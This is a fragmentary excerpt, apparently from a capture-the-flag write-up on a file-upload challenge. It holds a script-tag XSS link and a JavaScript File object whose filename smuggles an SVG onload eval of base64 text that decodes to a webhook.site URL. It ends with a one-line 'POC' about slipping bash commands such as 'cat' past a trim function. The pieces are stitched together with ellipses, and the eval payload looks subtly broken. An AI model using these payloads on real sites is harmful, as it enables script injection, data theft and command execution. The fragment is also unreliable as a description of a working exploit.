...
```html
<a href=''><script>alert(1)</script>.png>uploaded chall-sc!</a>
```
...
<script>
  const file = new File(["foo"], "foo'><svg onload=eval(atob('aHR0cHM6Ly93ZWJob29rLnNpdGUvZGE0NWViMTctYzIzZC00NmViLWE2N2ItZGE3MTY4ZWE1MDhi=='))>.jpg", {
      type: "chall-sc/jpeg",
  });
...
#### POC
With the following payload, we can create a trim function that ignores arbitrary bash commands that we pass, which is "*cat * #*"
```
